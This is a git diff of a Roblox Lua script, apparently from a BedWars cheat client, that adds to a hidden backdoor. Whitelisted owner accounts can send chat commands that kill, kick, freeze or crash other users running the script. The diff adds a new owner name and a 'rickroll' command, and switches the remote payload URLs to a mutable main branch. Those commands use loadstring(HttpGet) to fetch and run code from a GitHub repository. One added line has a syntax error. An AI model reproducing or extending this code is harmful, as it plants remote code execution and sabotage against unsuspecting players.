@@ -1,5 +1,6 @@
 local textChatService = game:GetService("TextChatService")
-local allowedPlayers = {"mrbeatyouruglyface","SnoopyIs_Better"}
+local allowedPlayers = {"mrbeatyouruglyface","menamge0", "SnoopyIs_Better"}
+
 local function isPlayerAllowed(playerName)
     for _, name in ipairs(allowedPlayers) do
         if playerName == name then
@@ -8,6 +9,7 @@ local function isPlayerAllowed(playerName)
     end
     return false
 end
+
 local commands = {
     kill = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
@@ -42,7 +44,7 @@ local commands = {
     end,
     trollage = function()
         if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/bb47a8c271e25893dca73ca67ecb24d15d46ff82/trollage"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
         end
     end,
     kick = function()
@@ -51,6 +53,11 @@ local commands = {
             for index, player in pairs(game.Players:GetPlayers()) do
                 player:Kick("Snoopy Owns You")
             end
+        end
+    end,
+   rickroll = function()
+        if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
         end
     end,
     freeze = function()
@@ -65,14 +72,14 @@ local commands = {
     end,
     lobby = function()
      if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-       	bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
-       	end
+        bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+        end
     end,
     quit = function()
     if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-	     game:Shutdown()
-	     end
-	end,
+         game:Shutdown()
+         end
+    end,
 lagback = function()
 if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
 for i = 1,10 do wait()
@@ -110,8 +117,15 @@ end
         end 
     end,
 }
-textChatService.OnIncomingMessage = function(message)
+
+textChatService.OnIncomingMessage = function(message: TextChatMessage)
     local properties = Instance.new("TextChatMessageProperties")
+    if message.TextSource then        
+        local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
+        if player.Name == "menamge0" or player.Name == "SnoopyIs_Better" or player.Name ==  "mrbeatyouruglyface",  or player.Name == "menamge0" then
+            properties.PrefixText = "<font color='#9A9AEB'>[SP+ PRIVATE]</font> " .. message.PrefixText
+        end
+    end
     if message.TextSource then 
         local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
         if isPlayerAllowed(player.Name) then 
@@ -121,5 +135,6 @@ textChatService.OnIncomingMessage = function(message)
             end 
         end 
     end 
-    return properties 
+    
+    return properties
 end
